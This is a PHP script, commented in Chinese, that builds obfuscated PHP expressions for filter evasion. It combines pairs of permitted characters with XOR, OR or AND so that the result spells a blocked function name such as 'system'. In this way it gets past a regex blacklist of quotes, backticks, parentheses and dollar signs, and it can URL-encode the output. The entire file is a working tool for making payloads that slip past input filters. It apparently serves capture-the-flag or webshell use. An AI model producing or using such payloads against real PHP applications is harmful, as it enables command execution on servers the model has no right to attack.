<?php
// 选择可用的位运算符
function select_op($blacklist) {
    $f_list = array("^", "|", "&");
    $operator = "";
    for ($i=0; $i < count($f_list); $i++) {
        $op =  $f_list[$i];
        if (!preg_match($blacklist, $op)) {
            $operator = $op;
            break;
        }
    }
    if (empty($operator)) {
        exit("没有可用的位运算符！");
    }
    return $operator;
}

// 选择可用的引号
function select_quot($blacklist) {
    $q_arr = array("'", '"', "‘", "’", "“", "”");
    $quot = "";
    foreach ($q_arr as $q) {
        if (!preg_match($blacklist, $q)) {
            $quot = $q;
            break;
        }
    }
    if (empty($quot)) {
        exit("没有可用的引号！");
    }
    return $quot;
}

// 去除黑名单字符
function check($blacklist, $str_arr) {
    $ok_str = array();
    foreach ($str_arr as $str) {
        preg_match($blacklist, $str) ? null : array_push($ok_str, $str);
    }
    return $ok_str;
}

// 生成 Ascii
function create_ascii() {
    $ascii_arr = array();
    for ($i=0; $i < 256; $i++) { 
        array_push($ascii_arr, chr($i));
    }
    return $ascii_arr;
}

// 生成位运算字符表
function generate($dict_path, $blacklist, $all_ascii) {
    $result = array();
    $operator = select_op($blacklist);

    if ($all_ascii)
        // 读取 Ascii 字符表
        $ascii_list = explode("\n", file_get_contents($dict_path));
    else
        // 生成 Ascii 字符表
        $ascii_list = create_ascii();

    // 去除黑名单字符
    $ascii_list = check($blacklist, $ascii_list); 

    foreach ($ascii_list as $x) {
        foreach ($ascii_list as $y) {
            // 位运算
            if ($operator == "^")
                $res = $x ^ $y;
            if ($operator == "|")
                $res = $x | $y;
            if ($operator == "&")
                $res = $x & $y;

            // 结果是否在 ASCII 打印字符范围内
            if (ord($res) > 32 && ord($res) < 127 && strlen($res) == 1) {
                $expression = array($x, $operator, $y, $res);
                array_push($result, $expression);
            }
        }
    }
    return $result;
}

// 生成表达式
function confuse($op_tables, $blacklist, $code, $url_encode) {
    $operator = select_op($blacklist);
    $quot = select_quot($blacklist);
    
    $left = "";
    $right = "";
    foreach (str_split($code) as $code_i) {
        for ($j=0; $j < count($op_tables); $j++) {
            $item = $op_tables[$j];
            if ($item[3] == $code_i) {
                if (!preg_match($blacklist, $item[0]) && !preg_match($blacklist, $item[2])) {
                    $left .= $item[0];
                    $right .= $item[2];
                    break;
                }
            }
        }
    }
    $s = sprintf("%s%s%s%s%s%s%s", $quot, $left, $quot, $operator, $quot, $right, $quot);
    if ($url_encode) {
        echo urlencode($s), "\n";
    } else {
        echo $s, "\n";
    }
}

$dict_path = "./Ascii.txt";  // 字符文件
$all_ascii = true;  // 使用所有Ascii字符
$url_encode = false;  # 是否进行url编码

$blacklist = "/[\" `()$\\^]/s";  // 黑名单，正则表达式
$code = "system";  # php代码

$op_tables = generate($dict_path, $blacklist, $all_ascii);
confuse($op_tables, $blacklist, $code, $url_encode);
echo "\n";